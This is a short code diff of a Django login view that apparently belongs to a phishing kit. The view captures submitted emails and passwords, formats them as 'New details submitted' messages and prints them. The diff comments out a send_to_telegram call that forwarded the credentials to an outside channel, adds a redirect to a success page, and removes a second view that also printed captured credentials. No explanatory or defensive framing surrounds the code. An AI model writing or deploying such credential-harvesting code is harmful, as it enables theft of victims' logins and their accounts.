@@ -24,17 +24,12 @@ def login_view(request):
         #     )
         subject = 'New details submitted'
         mail_message = f"{subject}\nusername: {email}\npassword: {password}"
-        send_to_telegram(mail_message)
+        #send_to_telegram(mail_message)
         print(mail_message)
-        
+        return redirect('success')
     return render(request, 'index.html')
 
 def success_view(request):
-    if request.method == 'POST':
-        username = request.POST.get('email')
-        password = request.POST.get('pass')
-        subject = 'New details submitted'
-        mail_message = f"{subject}\nusername: {username}\npassword: {password}"
-        print(mail_message)
+
     return render(request, 'back.html')
 
